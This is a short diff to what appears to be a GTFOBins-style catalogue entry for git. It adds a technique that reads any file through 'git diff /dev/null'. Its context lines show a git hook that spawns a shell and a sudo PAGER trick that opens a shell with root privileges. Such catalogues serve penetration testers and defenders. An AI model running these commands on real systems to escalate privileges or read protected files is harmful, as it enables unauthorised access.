@@ -13,6 +13,11 @@ functions:
         echo 'exec /bin/sh 0<&2 1>&2' >"$TF/.git/hooks/pre-commit.sample"
         mv "$TF/.git/hooks/pre-commit.sample" "$TF/.git/hooks/pre-commit"
         git -C "$TF" commit --allow-empty -m x
+  file-read:
+    - description: The read file content is displayed in `diff` style output format.
+      code: |
+        LFILE=file_to_read
+        git diff /dev/null $LFILE
   sudo:
     - code: sudo PAGER='sh -c "exec sh 0<&1"' git -p help
     - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
